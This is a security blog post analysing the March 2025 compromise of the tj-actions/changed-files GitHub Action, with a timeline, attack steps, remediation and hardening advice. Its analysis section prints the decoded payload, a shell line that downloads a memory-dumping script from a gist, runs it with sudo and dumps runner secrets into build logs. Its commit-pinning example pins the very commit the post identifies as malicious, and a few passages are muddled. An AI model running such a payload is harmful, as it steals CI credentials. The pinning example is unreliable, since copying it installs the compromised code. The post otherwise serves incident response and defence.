# CVE-2025-30066 tj-actions/changed-files GitHub Action Compromise: Impacts on Software Supply Chain Security and ASPM

The **tj-actions/changed-files** GitHub Action – a popular tool used in CI/CD workflows to list modified files in a commit or pull request – was recently **compromised** in a software supply chain attack. This action is integrated in over 23,000 repositories, making it a widespread dependency in DevSecOps pipelines.

The threats started Saturday, March 15 [https://news.ycombinator.com/item?id=43367987](https://news.ycombinator.com/item?id=43367987)

In March 2025, attackers injected malicious code into the action’s repository, turning a routine workflow tool into a vector for secret theft. The incident underscores the importance of **software supply chain security** and highlights gaps that modern **Application Security Posture Management (ASPM)** aims to address.

## **Timeline of the Compromise (UTC) for tj-actions:**

- **March 14, 2025 16:00** – An anomaly is detected by security monitors (StepSecurity Harden-Runner) when an unexpected external endpoint appears during a workflow using tj-actions/changed-files . This marks the initial compromise timeframe.
- **March 14, 2025 23:00** – Investigation reveals that **most version tags of tj-actions/changed-files have been retroactively updated to a malicious commit** . In other words, nearly all historical releases of the action were suddenly **pointing to compromised code**.
- **March 15, 2025 02:00** – Evidence emerges that the malicious action is causing **secrets to leak into build logs** on multiple public repositories . Any sensitive credentials in those CI environments may have been exposed.
- **March 15, 2025 14:00** – GitHub responds by **removing tj-actions/changed-files from the Actions marketplace**, effectively blocking workflows from using the compromised action. Organizations begin urgent remediation.
- **March 15, 2025 22:00** – The GitHub repository is **restored to a safe state**. All version tags are reverted to code without the malicious payload. Maintainers and the community start to assess damage and recovery steps.

Previous vulnerable Version: V1 -> V45 are all deemed to be compromised

Despite having the version now corrected by GitHub and sanitized, it is essential to verify if you have the previous version installed and from the GitHub action log

![](https://phoenix.security/media/Screenshot-2025-03-16-at-11.19.33%E2%80%AFAM-1200x731.jpg.webp)

This is a clean version

![](https://phoenix.security/media/Screenshot-2025-03-16-at-8.51.15%E2%80%AFAM-1200x541.png.webp)

## **Verify impacted files:**

To audit all the repos that have been executing and to test, you can run [https://github.com/cyberkartik/tj-actions-test/blob/main/tj-action-search-phoenix-V2.py](https://github.com/cyberkartik/tj-actions-test/blob/main/tj-action-search-phoenix-V2.py)

And clone the repo [https://github.com/cyberkartik/tj-actions-test](https://github.com/cyberkartik/tj-actions-test) to check if there are matches

For Security Clients there is a version with automatic upload of results: [https://github.com/cyberkartik/tj-actions-test/blob/main/tj-action-search-phoenix-V2-with-upload.py](https://github.com/cyberkartik/tj-actions-test/blob/main/tj-action-search-phoenix-V2-with-upload.py)[phoenix-V2-with-upload.py](https://github.com/Security-Phoenix-demo/tj-actions-test/blob/main/tj-action-search-phoenix-V2-with-upload.py)

## **Where to check**

[](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfVTEClf1yziJRJjkgIcTrYWCM5_X15tVqFaXMQSUlLFuYbv10qNgV9eDbtrFa_ai7xijqfQ9nCK26PRzUdwoNRtgXihYQEmLsX1KHehRNXMDJaNfCx1Sz6Fyta-N0A9iXJpkQt?key=0oRamfDERFkcpNUZDmxhqTt8)

Action logs

[](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfIpbukObYuZSAOL8tQ0PxDKY7D4B4QcZmsmoLTlhNjsXQOFwbrMz4aLBoAVW50LYXQ06VENHXery8kIXUcIDkrR6M8bhvWTGBPv58FZGRkxu9HSdScTjZ7Yn1ulbLvuXbwCLYphQ?key=0oRamfDERFkcpNUZDmxhqTt8)

An example of a leaked secret:

[](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdzgxCiAc32JFfCeT1Q1NX9mYmnZ5t8eIsXLaVcVXzXegfedBmoNp8gtT5JXdMwDCkN2D0bxXIMboXR1MPvgSV_CBq-p1BLY-q8ZM6mNtOsBusa7rVmVvQh3CjGWTc2asz5KQ76PQ?key=0oRamfDERFkcpNUZDmxhqTt8)

## **How does the attack work:**

![](https://phoenix.security/media/Screenshot-2025-03-16-at-3.40.56%E2%80%AFPM-1200x713.png.webp)

**Attack Steps of the tj-actions/changed-files Compromise**

1. **Gain Access to the Repository**

- The attacker obtained **write access** to the tj-actions/changed-files repository.
- This access was likely achieved by compromising the **Personal Access Token (PAT)** of the @tj-actions-bot account.
- GitHub has not determined exactly how the PAT was stolen.

2. **Introduce a Malicious Commit**

- The attacker **spoofed a Renovate bot commit**, making it look like a routine dependency update.
- The commit was **orphaned** (not attached to main or any other active branch), reducing visibility.
- The commit was **unsigned and unverified**, but many users don’t check commit signatures.

3. **Retagging Existing Versions to Point to Malicious Code**

- The attacker **moved multiple historical version tags** (e.g., v1.0.0, v35.7.7, etc.) to point to the **malicious commit SHA**.
- This caused **all workflows referencing any of these tags** to unknowingly fetch the compromised version.
- Many users assume **Git tags are immutable**, but in reality, they can be overwritten by someone with write access.

4. **Modify the Action to Fetch an Additional Malicious Script**

- The attacker modified the action’s code to **download an external Python script** from gist.githubusercontent.com.
- This script contained **base64-encoded obfuscated payloads** to evade simple detection.
- The use of GitHub Gists instead of external servers may have delayed detection.

5. **Execute the Malicious Script to Extract Secrets**

- The downloaded script **dumped memory from the GitHub Actions runner** by targeting the Runner.Worker process.
- The script **used regex-based pattern matching** to search for secrets, API tokens, and credentials.
- Extracted secrets were **base64-encoded** and **printed to the workflow logs**.

6. **Leverage Public Logs Instead of Direct Exfiltration**

- Instead of sending the stolen secrets to an external server, the attacker relied on **public repository logs**.
- Anyone monitoring GitHub logs could access these exposed secrets.
- This unusual approach suggests the attack may have been **targeting specific high-profile public repositories**.

7. **Potential Exploitation via Auto-Merging Workflows**

- Some repositories had **automated PR merging enabled** for dependency updates (e.g., Renovate bot auto-merging PRs).
- This could have allowed **automatic execution of the compromised action** without direct human review.

8. **GitHub Takes Action to Mitigate the Attack**

- GitHub detected the attack and **removed the tj-actions/changed-files repository** from the Actions marketplace.
- The repository was later restored, with **all malicious versions removed**.
- The @tj-actions-bot account had its **password reset, PAT revoked, and authentication upgraded to passkey security**.
- GitHub flagged the affected organization to **prevent further exploitation**.

## **How to prevent similar attacks**

1. As an alternative, [GitHub has a feature that lets you allow-list GitHub actions](https://docs.github.com/en/organizations/managing-organization-settings/disabling-or-limiting-github-actions-for-your-organization#allowing-select-actions-and-reusable-workflows-to-run) so you can ensure it won’t run, even if it’s still in your code.
2. Remove tj-actions/changed-files from the list of GitHub Actions.
3. Go to GitHub settings and configure it like this at:[https://github.com/semgrep/semgrep-app/settings/actions](https://github.com/semgrep/semgrep-app/settings/actions)
4. Generally, pin all GitHub Actions to specific commit SHAs (rather than version tags) you know are safe. In this case, it appears that all versions are compromised.

## **Audit past workflow runs for signs of compromise. Check logs for suspicious outbound network requests. Prioritize repos where your CI runner logs are public, as secrets are dumped to stdout in the payload.**

## **Timeline of Attack**

This fast-moving timeline shows how quickly a supply chain attack can unfold, impacting thousands of projects within hours. Next, we examine how the attack was carried out and what payload was delivered.

# **Get in touch for a maturity assessment**

[Contact Us](https://phoenix.security/calendy-book-a-meeting/)

**Attack Vector & Exploit Analysis**

The compromise was executed via a direct repo breach rather than a vulnerability in the code. **Attackers gained write access to the tj-actions/changed-files repository**, likely by compromising the maintainer’s account or CI pipeline or acting as legitimate mantainers, differently from [xz type supply chain attack](https://phoenix.security/cve-2024-3094/) this one was less obfuscated and more blunt in a way. They introduced a malicious commit to the codebase, deceptively masquerading it as an automated dependency update. In fact, the attackers **spoofed the identity of a Renovate bot in the commit** metadata, using a commit message typical of Renovate (“chore(deps): lock file maintenance”) . This fake Renovate commit was an orphan (not part of the main branch), subtly obfuscating the change. Notably, the commit was unsigned/unverified, but many users do not routinely check commit signatures for third-party actions.

Note: All these tags now point to the same malicious commit hash:0e58ed8671d6b60d0890c21b07f8835ace038e67, indicating the retroactive compromise of multiple versions.”

$ git tag -l | while read -r tag ; do git show –format=”$tag: %H” –no-patch $tag ; done | sort -k2

v1.0.0: 0e58ed8671d6b60d0890c21b07f8835ace038e67

…

v35.7.7-sec: 0e58ed8671d6b60d0890c21b07f8835ace038e67

…

v44.5.1: 0e58ed8671d6b60d0890c21b07f8835ace038e67

…

v5: 0e58ed8671d6b60d0890c21b07f8835ace038e67

…

[@salolivares](https://github.com/salolivares) has identified the malicious commit that introduces the exploit code in the Action.

[https://github.com/tj-actions/changed-files/commit/0e58ed8671d6b60d0890c21b07f8835ace038e67](https://github.com/tj-actions/changed-files/commit/0e58ed8671d6b60d0890c21b07f8835ace038e67)

[](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20602%20233'%3E%3C/svg%3E)

credit for the image StepSecurity

Once the malicious code was in the repository, the attackers **retroactively retagged many existing release versions** to point to this new malicious commit. Workflows that referenced a specific version tag (e.g. v35.7.0) now inadvertently pulled in the compromised code. Many teams assume that git tags (especially version tags following SemVer) are immutable, but in reality, tags can be moved if an attacker has push access. This tag tampering was central to the attack’s spread – even pinned versions became poisoned. Essentially, the supply chain attack piggybacked on the trust of version tags.

**Malicious Payload:** The injected code was designed to **exfiltrate secrets from the CI environment**. Instead of directly reaching out to an external server (which might have been noticed by firewalls or monitoring), the payload cleverly dumped secrets to the build log itself. **It executed a script that scanned the memory of the runner process (targeting the Runner.Worker process)** to locate sensitive data, and then printed those secrets to the job’s standard output. If a repository’s workflow logs were public (as is often the case for open-source projects), any secret in those logs became openly exposed. The exploit accomplished this by fetching a malicious Python script from an external GitHub Gist and running it in the CI runner context . This script (memdump.py) essentially did a memory dump of the running container/VM, searching for credential patterns and environment variable values.

The base64 encoded string in the above screenshot contains the exploit code. Here is the base64 decoded version of the code.

‍

if [[ “$OSTYPE” == “linux-gnu” ]]; then

B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d ‘\0’ | grep -aoE ‘”[^”]+”:\{“value”:”[^”]*”,”isSecret”:true\}’ | sort -u | base64 -w 0 | base64 -w 0`

echo $B64_BLOB

else

exit 0

fi

(credit Stepsecurity for the initial decode)

The compromised action added a step that uses curl and python3 to download and execute a memory-dumping script from a GitHub gist. This script scans the GitHub Actions runner’s memory for secrets and prints any findings to the build log. By dumping secrets to stdout, the attack avoids needing direct network exfiltration from the runner, yet still effectively steals secrets (especially in public repos where logs are visible to anyone).

The **exploit payload** appeared to target common CI secrets – for example, GitHub tokens, cloud provider keys, or other credentials stored in memory. It leveraged low-level access: by running with appropriate permissions on the GitHub-hosted runner, the malicious code could invoke system utilities (sudo, memory inspection tools) to read another process’s memory space . This is a sophisticated technique, more advanced than simply printing environment variables. Upwind’s analysis noted that the malicious code gained **direct access to the runner’s container and VM memory**, allowing the extraction of sensitive information that might not even be in environment variables. In effect, the CI runner’s defenses were turned against it – the action was doing exactly what it was allowed to do (run code on the runner), but that code was performing a memory scrape.

All harvested secrets were then printed to the job log. StepSecurity investigators confirmed that **numerous repositories had secrets appearing in their Actions logs as a result of this payload** . Fortunately, at this stage there was **no evidence of an external server directly receiving the secrets** – the attacker may have intended to manually scour the public logs later or rely on the fact that others could grab them once exposed. This method is a stark reminder that **secret leakage can occur even without direct network exfiltration**; an attacker can simply put the secrets in a place the victim will publish themselves (like public logs).

It’s worth noting that this was **not the first security issue involving tj-actions/changed-files**. A prior vulnerability (CVE-2023-51664) was disclosed for this Action, which allowed an attacker to inject arbitrary commands by crafting file names in a pull request. That earlier flaw (fixed in version 41.0.0) demonstrated how untrusted input to CI actions could result in remote code execution and secret leakage. While CVE-2023-51664 is unrelated to the March 2025 compromise (which was a direct repository takeover), it underscores that **application security** issues in CI/CD tools can take many forms – both vulnerabilities and outright compromises. The combination of a widely-used Action, prior security weaknesses, and a successful supply chain attack makes this case especially concerning for DevSecOps professionals.

Action Review logs

[](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdzgxCiAc32JFfCeT1Q1NX9mYmnZ5t8eIsXLaVcVXzXegfedBmoNp8gtT5JXdMwDCkN2D0bxXIMboXR1MPvgSV_CBq-p1BLY-q8ZM6mNtOsBusa7rVmVvQh3CjGWTc2asz5KQ76PQ?key=0oRamfDERFkcpNUZDmxhqTt8)

‍

This step is especially important for public repositories since their logs are publicly accessible.

**Supply Chain Security Risks Exposed**

This incident highlights several **software supply chain security** risks associated with third-party GitHub Actions and open-source dependencies:

- **Compromised CI Components = Compromised Pipeline:** Using a third-party action in your workflow is effectively running someone else’s code in your CI environment. If that code is malicious, attackers gain a foothold in your build process. In this case, the malicious tj-actions/changed-files had **full access to the CI runner’s context**, including secrets and filesystem, as evidenced by its ability to read container memory. This level of access means a compromised Action can potentially alter build artifacts, steal secrets, or pivot to other internal resources. It’s equivalent to a trusted library in your application turning malicious – but here, it’s your CI pipeline that’s at stake.
- **Secrets Exposure in Public Repositories:** Many GitHub Actions workflows (especially in open-source projects) run on public repositories with logs that are world-readable. The attack leveraged this by printing secrets to logs. **Any credentials exposed in a public Actions log are effectively compromised**. For organizations, this could include cloud API keys, signing keys, or credentials that grant access to internal systems. Even in private repos, leaked secrets in logs are a risk if log storage isn’t tightly controlled. This incident underscores the risk of **secret sprawl**: once a secret leaves its safe environment (even into a log), it can be harvested by attackers.
- **Retroactive Tampering with Version Tags:** Perhaps the most alarming aspect was the attacker’s ability to **retroactively modify release tags** to point to the malicious code. Most CI configurations pin Actions by a version tag (e.g., uses: tj-actions/changed-files@v11). Users assume that v11 will always refer to the original code released as v11. However, as seen here, an attacker with repository control can delete and recreate a tag, or force-push a tag to a new commit. Git tags are not immutable by design, even if it’s rare to see them changed. This means **trusting a tag name is not enough** – it must be cryptographically verified or pinned by a commit. The supply chain attack leveraged this gap: workflows that hadn’t changed in months suddenly began running a malicious version of the action because the tag they pointed to was silently moved to a different commit. Retroactive tampering is a nightmare scenario for supply chain integrity, as it subverts even those who had locked to a specific version.
- **Widespread Impact Due to Reuse:** The popularity of tj-actions/changed-files (tens of thousands of repositories) amplified the blast radius. This is characteristic of supply chain attacks: one compromise can cascade into many victims. In this case, any DevSecOps team using the action became vulnerable to secret leakage without any action on their part. **Software supply chain ASPM** principles call for understanding where such dependencies are used and what the potential impact of their compromise would be. This incident will likely prompt organizations to re-evaluate the third-party components in their CI pipelines and apply stricter scrutiny or controls.

In summary, a malicious GitHub Action is just as dangerous as a malicious library in your application. It can undermine your entire CI/CD **security posture**. The combination of **trust in open-source** plus **CI automation** creates a high-leverage attack vector – one that attackers are increasingly targeting.

**Real-World Consequences for DevSecOps Teams**

What are the consequences of this? First of all realize Github actions are as bad if not worse than Library in code. Why i say this? Because there are definitely less scan and control and adoption is more relaxed.

- **Immediate Incident Response:** Organizations relying on the affected Action had to react swiftly. Any secrets that may have been exposed in build logs must be considered compromised. Indeed, within hours of the exploit, multiple projects were identified where **API keys and tokens had been dumped to public logs** . This forces teams into emergency secret rotation – revoking tokens, regenerating keys, and reviewing audit logs for potential unauthorized access using those credentials. For large organizations, identifying where a leaked credential was used can be a huge effort.
- **Pipeline Disruption:** GitHub’s removal of the action (to contain the incident) meant that any workflow using tj-actions/changed-files would fail to run thereafter. i
- **Trust Erosion:** if you had trust in actions, now is the time to revisit them, and this is a good thing

**Trust Erosion:** credentials exposed, if you have a public repo rotate the keys, if you have a private org repo

Ultimately, don’t rely only on one method to secure run of CI/CD and running eBPF on runners of action or other monitoring tools is complex ([**as James B refers here**](https://pulse.latio.tech/p/understanding-and-re-creating-the))

Detection: as xz this version check was because of the eye and code review and it could have gotten way worse, the only trigger was the communication with something different than github

[](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcSIG9iFWw66dUhsGGPSYLnjkaUNy0SOr1gdGALudG1I0Kw-d_ggAIjZiRiqBLirk7N3Wokc-chEd2OM0k0rMBaSAJp4_Kk8744zpYrY_XocUouyDTusg3vGIXMBDNhtVJqosZ5SQ?key=0oRamfDERFkcpNUZDmxhqTt8)

Other Similar Supply chain attacks

- *Codecov Bash Uploader (2021):* Attackers breached a popular CI tool’s script, modifying it to siphon off CI environment variables (including secrets) to a remote server. This went undetected for months and affected thousands of downstream customers, proving how a CI tool compromise can lead to widespread credential theft.
- *SolarWinds Orion Build (2020):* In a notorious nation-state supply chain attack, SolarWinds’ build pipeline was compromised. Attackers injected malicious code into the Orion product during the build process, which was then delivered to thousands of organizations as a trusted update. This showed that even highly secured enterprises can be breached via a compromised software build.
- *Travis CI Secrets Leak (2021):* A vulnerability in Travis CI exposed secret environment variables from forked PR builds, demonstrating another path by which CI secrets can inadvertently leak to attackers.
- *(Other open-source package compromises)*: Beyond CI pipelines, attackers frequently target open-source libraries (e.g., the event-stream NPM package incident) to inject malicious code. The common theme is injecting exploits into the supply chain, where they propagate widely and quietly.

**Detection & Remediation Strategies**

When a supply chain attack like this comes to light, **detecting whether your organization is affected** is the first priority. DevSecOps teams can take these steps:

1. **Identify Usage of the Compromised Action:** Search across your codebase for any reference to “tj-actions/changed-files” in workflow files. A simple grep through your repository (or all your repos) can reveal if and where this action is used . For example:

git grep -R “tj-actions/changed-files” .

On GitHub, you can use advanced code search queries. For instance, search your org’s code for uses: tj-actions/changed-files in workflow YAML files . This will quickly enumerate repositories and pipelines that include the action. (Semgrep even provided a ready-made scanning rule to find usages of this specific action .)

2. **Halt and Replace the Malicious Action:** Immediately **stop using tj-actions/changed-files** in all workflows that were identified. Simply removing it from your main branch might not be sufficient – it could still exist in older branches or tags and run in those contexts . Do a thorough purge or disable the workflows until fixed. If possible, utilize GitHub’s organization security settings to **temporarily block the action** across the org: GitHub allows admins to **allow-list specific actions** and thereby block all others . By adding tj-actions/changed-files to a deny list (or conversely only allowing a safe list of actions), you can prevent any pipeline from invoking it, even if the reference still exists in code. This provides an immediate safety net while you remediate the code.

3. **Assess Exposure – Audit Logs and Runs:** Determine if your pipelines actually encountered the malicious code. Review recent workflow run logs for any suspicious output or behavior. Specifically, look for signs of the exploit – e.g., references to gist.githubusercontent.com (which was used to fetch the payload) or unusual blocks of base64 text in logs (potentially encoded secrets). The Semgrep team recommends checking for any unexpected network calls or anomalies in workflow execution as an indicator . If your CI logs are public, pay extra attention as anyone could have seen exposed secrets. For each pipeline that used the action, **inspect the logs around the timeframe of the compromise (starting March 14, 2025)** to see if secrets were printed.

4. **Rotate Secrets Immediately:** If you discover that any sensitive values (API keys, tokens, passwords) were printed in logs or could have been accessed by the malicious action, **rotate those secrets without delay**. In practice, this means revoking or changing those credentials. For example, generate new tokens, change passwords, and invalidate old keys. Incident responders from StepSecurity explicitly advise: *If you find secrets in your GitHub Actions logs, rotate them immediately* . Even if you’re not sure whether a secret was leaked, it’s safer to presume compromise and refresh it. It’s also wise to **review access logs** for those secrets (e.g., check if a cloud API key was used from an unusual location after the incident timeframe), as that could indicate malicious use.

**Best Practices for Securing GitHub Actions**

In the wake of this incident, DevSecOps teams should strengthen their processes around third-party GitHub Actions and CI/CD security in general. Here are some **best practices** to consider adopting (if not already in place):

- **Pin Actions to Specific Commit SHAs:** Instead of using floating version tags (or even version numbers) for actions, pin them to a specific commit hash. For example:

– uses: tj-actions/changed-files@0e58ed8671d6b60d0890c21b07f8835ace038e67

Using the full commit SHA ensures you know exactly which code is being pulled. Tags can be moved, but a commit hash reference will only pull that exact revision. Many security experts recommend this as a defense against tag tampering . Do note, however, that you must still verify out-of-band that the commit in question is safe. In this incident, pinning to a commit wouldn’t have helped if you pinned one of the compromised commits – but it would have prevented your workflow from unknowingly drifting to a different commit masquerading behind a tag. To manage this, you might maintain an internal list of approved commit SHAs for third-party actions.

- **Verify Integrity and Signatures:** Whenever possible, use actions from sources that support signed releases or use checksum verification. Some GitHub Actions allow you to verify a GPG signature on the downloaded action code. Additionally, GitHub has introduced mechanisms (like digest hashes for docker container actions) to ensure you pull what you expect. While not all third-party actions support this, pushing the ecosystem towards signed commits/tags (perhaps via Sigstore’s Cosign for actions) is a worthwhile goal for supply chain security.
- **Use GitHub Actions Allow-Listing:** GitHub Enterprise customers can restrict which actions are allowed to run in their organization or repository . By maintaining an allow-list of trusted action sources (for example, only actions from your own org or certain verified publishers), you can reduce the chance of an unvetted action running. If an action isn’t on the approved list, GitHub will simply refuse to execute it. In an environment where this is enabled, even if a developer unintentionally tries to use a malicious action, it won’t run. This feature can be a lifesaver for preventing the usage of unknown or compromised actions. It does require actively curating the allow-list, which means you need to inventory and decide on all third-party actions your workflows use (an automated query or tool can help enumerate these ).
- **Principle of Least Privilege for Workflows:** Ensure that your CI workflows and actions run with the minimal permissions needed. GitHub Actions allows fine-grained control of the permissions granted to the GITHUB_TOKEN and can even restrict external network access. For example, if an action only needs read access to the repo and no ability to push code or write to issues, scope the token accordingly. In this incident, a read-only token wouldn’t stop secrets from being read from memory, but it could limit lateral movement (the malicious code couldn’t, say, create issues or push code to other repos using the GitHub API if the token had no such scopes). Also, consider adding egress restrictions on self-hosted runners or using tools to restrict actions from making unexpected outbound calls (some solutions intercept calls to external URLs and can block unknown domains).
- **Monitor and Sandbox Runner Behavior:** Implement **proactive security monitoring** for your CI runners. The fact that StepSecurity’s Harden-Runner detected an unusual network endpoint (the external gist URL) is a testament to the value of runtime monitoring . Tools like Harden-Runner act as an application firewall for GitHub Actions, monitoring network traffic, file system access, and process execution in real-time. If an action suddenly tries to do something outside its normal scope (e.g., open an internet connection to an unknown host or read protected memory), these tools can alert or even block the behavior. Similarly, some organizations run their CI jobs inside isolated containers or VMs with seccomp or AppArmor profiles to limit syscalls like ptrace (which could stop a memory-dumping attempt). Utilizing such **ASPM tools** and services – which continuously watch the posture and behavior of your applications and pipelines – can provide early warning of a supply chain attack in progress.
- **Regular Dependency Audits (Including Actions):** Just as you would regularly run npm audit or check for CVEs in your application libraries, do the same for your GitHub Actions and other CI/CD dependencies. Subscribe to notifications for security advisories on the GitHub Actions you use (GitHub has a security advisory feature for repositories). There is now a published CVE (e.g., CVE-2025-30066) for this incident ; ensure you have a process to become aware of such advisories. An **Application Security Posture Management** approach means continuously evaluating the security posture of not only your application code but also your pipeline code and configurations. This could involve automated tools that flag if you’re using an action with a known vulnerability or if an action’s maintainership changes (which could be a risk signal).
- **Practice Incident Response Drills for CI/CD:** The chaos induced by this compromise is a reminder that teams should have a response plan for CI/CD incidents. Conduct drills or tabletop exercises: *What if our build pipeline was compromised?* Determine how you would recover: do you know all the secrets that could be affected? Can you rebuild runner machines from scratch if needed? Having backups or the ability to revert to earlier known-good versions of actions or pipeline configurations can speed up recovery. Moreover, ensure that secrets used in CI are scoped in such a way that if they leak, the damage is limited (for example, use short-lived credentials or service accounts with limited permissions specifically for CI).

Implementing these best practices creates multiple layers of defense. No single measure is foolproof – for instance, pinning to a commit doesn’t help if that commit itself is bad, and allow-listing won’t catch an allowed action that later turns – so defense-in-depth is key. The goal is to raise the cost for attackers and to increase the likelihood of detecting something wrong before it causes harm. **Software supply chain security** is an evolving field, and we must evolve our strategies in tandem.

## **Investigate and Scan Open-Source Projects regardless of where they come from**

This incident serves as a wake-up call for the community. DevSecOps teams should take this opportunity to **proactively investigate their exposure and tighten the security of their open-source supply chain**:

- **Audit Your Open-Source Dependencies:** Conduct a thorough audit of all third-party components in your build and deployment processes. This includes GitHub Actions, build scripts, Docker images, package dependencies, and even compiler tools. Catalog them and assess their trustworthiness. Are they actively maintained? Do they have a history of security issues? Supply chain ASPM tools or services can assist in maintaining an up-to-date inventory and risk profile of these dependencies.
- **Use Static Analysis and SAST Tools:** Leverage static analysis to detect insecure configurations or usage of risky patterns in CI/CD code. For example, use **Semgrep** or similar SAST tools to scan your workflow files for anti-patterns (like using unpinned actions, or overly broad permissions). Custom rules can be written to flag usage of certain actions so you’re aware of where they are used. GitHub’s own CodeQL can be extended to analyze configuration as code. Some open-source projects also provide canned queries to find potentially dangerous setup in GitHub workflows.
- **Integrate Runtime Monitoring in CI:** Just as we monitor production systems, consider **monitoring your CI runtime**. This could be as simple as routing all runner outbound traffic through a proxy and logging it, or using dedicated solutions (like StepSecurity’s Harden-Runner or similar CI security platforms) to detect anomalies. If a build container that typically only talks to Docker Hub and your artifact repository suddenly tries to reach out to a GitHub Gist or an IP in an unusual range, you want to know. Modern ASPM philosophy encourages extending visibility to every phase of application development and deployment – CI pipelines included.
- **Educate and Involve Your Team:** Security is a team sport. Share lessons from this incident with developers, DevOps engineers, and SREs. Encourage a culture where adding a new GitHub Action to a workflow triggers a security review. Provide guidelines for what to consider before introducing a new dependency (e.g., check if the action is widely used, if the author is reputable, if the code is open and has had a security review, etc.). Encourage contributions to open-source security – for example, if your team has the capability, contribute fixes or security improvements to the actions you use.
